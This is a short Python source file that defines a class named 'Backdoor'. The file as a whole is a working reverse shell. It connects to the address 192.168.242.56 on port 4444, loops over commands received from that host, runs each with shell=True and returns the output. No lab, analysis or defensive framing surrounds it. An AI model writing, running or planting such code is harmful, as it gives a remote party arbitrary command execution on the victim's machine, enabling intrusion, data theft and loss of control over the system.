import socket
import subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.con.connect((ip,port))

    def execute_command(self,command):
        return subprocess.check_output(command,shell=True)

    def run(self):
        while True:
            commandrev = self.con.recv(1024)
            command_result = self.execute_command(commandrev.decode('utf-8'))
            self.con.send(command_result)

backdoor = Backdoor("192.168.242.56",4444)
backdoor.run()